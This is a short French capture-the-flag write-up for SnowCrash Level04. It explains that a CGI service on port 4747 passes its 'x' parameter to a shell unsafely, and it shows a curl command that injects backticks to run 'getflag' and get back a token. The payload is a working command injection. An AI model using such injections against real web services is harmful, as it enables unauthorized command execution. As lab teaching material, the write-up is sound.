# Level04

Nous remarquons qu'un CGI est présent sur le port 4747

Le serveur prend un parametre X qui execute une commande non sécurisé, il suffit de lui injecter
des backsticks pour executer une commande de notre choix:

```bash
level04@SnowCrash:~$ curl localhost:4747?x=\`getflag\`
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```
